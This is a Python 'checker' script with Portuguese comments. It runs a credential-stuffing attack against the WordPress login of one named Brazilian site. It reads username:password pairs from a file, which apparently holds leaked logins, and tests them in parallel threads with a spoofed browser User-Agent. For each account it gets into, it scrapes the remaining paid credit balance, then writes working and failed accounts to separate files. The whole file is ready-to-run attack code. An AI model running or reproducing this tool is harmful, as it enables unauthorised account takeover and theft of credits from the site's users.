import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

# Configurações
MAX_THREADS = 5
TIMEOUT = 15
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
BASE_URL = 'https://deskdata.com.br'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print("══════════════════════════════════")
    print("      DESKDATA CHECKER")
    print("══════════════════════════════════")
    print(f" ✅ LIVE: {stats['live']}")
    print(f" ❌ DIE: {stats['die']}")
    print(f" ⚠ ERROR: {stats['error']}")
    print(f" ⏳ TEMPO: {elapsed:.2f}s")
    print("══════════════════════════════════")

def check_login(username, password):
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
            'Referer': f'{BASE_URL}/entrar/'
        })

        # Primeiro obtém a página de login para pegar cookies
        session.get(f"{BASE_URL}/entrar/", timeout=TIMEOUT)

        # Dados para login
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Entrar",
            "redirect_to": f"{BASE_URL}/wp-admin/",
            "testcookie": "1"
        }

        # Faz o login
        response = session.post(
            f"{BASE_URL}/entrar/",
            data=data,
            allow_redirects=False,
            timeout=TIMEOUT
        )

        # Verifica se o login foi bem-sucedido
        if response.status_code == 302 and "wp-admin" in response.headers.get('Location', ''):
            # Verifica saldo
            dashboard = session.get(f"{BASE_URL}/wp-admin/", timeout=TIMEOUT).text
            if "Você não possui nenhum crédito disponível" in dashboard:
                stats['die'] += 1
                save_result(DIE_FILE, username, password, "Sem saldo")
                return f"[DIE] {username}:{password} (Sem saldo)"
            elif "No momento, você possui" in dashboard:
                start = dashboard.find("No momento, você possui") + len("No momento, você possui")
                end = dashboard.find("créditos disponíveis")
                creditos = dashboard[start:end].strip()
                stats['live'] += 1
                save_result(LIVE_FILE, username, password, creditos)
                return f"[LIVE] {username}:{password} ({creditos} créditos)"
            else:
                stats['live'] += 1
                save_result(LIVE_FILE, username, password, "Login OK")
                return f"[LIVE] {username}:{password} (Login OK)"
        else:
            stats['die'] += 1
            save_result(DIE_FILE, username, password, "Login falhou")
            return f"[DIE] {username}:{password} (Login falhou)"

    except Exception as e:
        stats['error'] += 1
        save_result(DIE_FILE, username, password, str(e))
        return f"[ERROR] {username}:{password} - {str(e)[:30]}"

def save_result(filename, user, password, extra=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{user}:{password}"
            if extra:
                line += f" | {extra}"
            f.write(line + "\n")
    except:
        pass

def main():
    if not os.path.exists(LOGINS_FILE):
        print(f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
        accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    
    stats['total'] = len(accounts)
    update_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            user, password = acc[0], acc[1]
            futures.append(executor.submit(check_login, user, password))

        for future in as_completed(futures):
            print(future.result())
            update_panel()

    print("\n✅ Verificação concluída!")

if __name__ == "__main__":
    main()